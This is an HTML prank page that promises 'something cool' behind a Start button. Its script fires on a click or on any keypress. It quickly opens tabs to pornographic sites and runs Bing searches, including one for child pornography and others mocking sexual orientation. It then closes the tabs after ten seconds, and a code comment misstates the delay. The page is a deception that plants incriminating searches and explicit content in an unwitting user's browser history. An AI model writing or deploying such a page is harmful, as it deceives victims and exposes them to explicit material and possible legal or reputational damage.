<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Click Me 😏</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f4f4f4;
        }
        button {
            font-size: 20px;
            padding: 10px 20px;
            cursor: pointer;
            background-color: #ff4757;
            color: white;
            border: none;
            border-radius: 5px;
        }
        button:hover {
            background-color: #e84118;
        }
    </style>
</head>
<body>

    <h1>Click the button for something cool! 😎</h1>
    <button onclick="prank()">Start</button>

    <script>
        function prank() {
            let urls = [
                "https://www.iloveyoulikeafatladylovesapples.com/",
                "https://theuselessweb.com/",
                "https://pointerpointer.com/",
                "https://cat-bounce.com/",
                "https://corndog.io/",
                "https://www.staggeringbeauty.com/",
                "https://pornhub.com",
                "https://sex.com",
                "https://gay.com",
                "https://www.bing.com/search?q=how%20to%20check%20if%20im%20gay&PC=U316&FORM=CHROMN",
                "https://www.bing.com/search?q=How%20to%20cure%20diaria&PC=U316&FORM=CHROMN",
                "https://www.bing.com/search?q=Gay%20sex&PC=U316&FORM=CHROMN",
                "https://www.bing.com/search?q=Child%20porn&qs=n&form=QBRE&sp=-1&ghc=1&lq=0&pq=how%20to%20&sc=12-7&sk=&cvid=2A9271FC102042E0B1C7C454A8BA94BC&ghsh=0&ghacc=0&ghpl="
            ];

            let prankTabs = [];

            // Open a "safe" first tab
            let safeTab = window.open("https://www.google.com", "_blank");
            if (!safeTab) {
                alert("Please allow pop-ups for this prank to work!"); 
                return;
            }

            // Open the prank tabs one by one
            urls.forEach((url, index) => {
                setTimeout(() => {
                    let tab = window.open(url, '_blank');
                    if (tab) prankTabs.push(tab);
                }, (index + 1) * 10); // Delays each tab by 1.5 sec
            });

            // Close tabs after 10 seconds
            setTimeout(() => {
                prankTabs.forEach(tab => tab.close());
            }, 10000);
        }

        // Extra: Also start prank if user presses any key
        document.addEventListener("keydown", prank);
    </script>

</body>
</html>
